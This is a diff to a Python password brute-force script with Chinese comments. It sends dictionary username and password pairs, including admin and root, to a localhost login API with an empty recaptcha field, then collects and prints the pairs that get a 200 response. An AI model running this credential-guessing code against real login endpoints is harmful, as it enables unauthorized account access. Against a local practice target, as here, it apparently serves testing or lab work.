@@ -21,20 +21,22 @@ def login():
     ################################实现登录过程开始
     payload = {
         "username": username,
-        "password": password
+        "password": password,
+        "recaptcha": ''
     }
-    r = requests.post("http://127.0.0.1/", data=payload)
+    r = requests.post("http://127.0.0.1/api/login", json=payload)
     # r = requests.post("https://httpbin.org/post", data=payload)
     # 判断是否登录成功
     # print(r.text)
     ##################################实现登录过程结束
 
     ##################################检查密码是否正确开始
-    if True:
-        # if r.status_code == 302:  # 根据实际情况修改此处，判定登录成功
+#    if True:
+    if r.status_code == 200:  # 根据实际情况修改此处，判定登录成功
         msg = login_info
         # 登录成功则把登录信息保存到success_queue
         success_queue.put(msg)
+        print(msg)
 
     ################################## 检查密码是否正确结束
 
@@ -49,7 +51,7 @@ def get_dict():
 
     passwords = [line.strip() for line in passwords]
 
-    username = ['admin', 'root', 'user', 'a', 'b', 'c', 'd', 'e', 'f', 'a', 'fa', 'aw']
+    username = ['admin', 'rot', 'user', 'a', 'b', 'c', 'd', 'e', 'f', 'a', 'fa', 'root']
 
     count = 0
     for u in username:
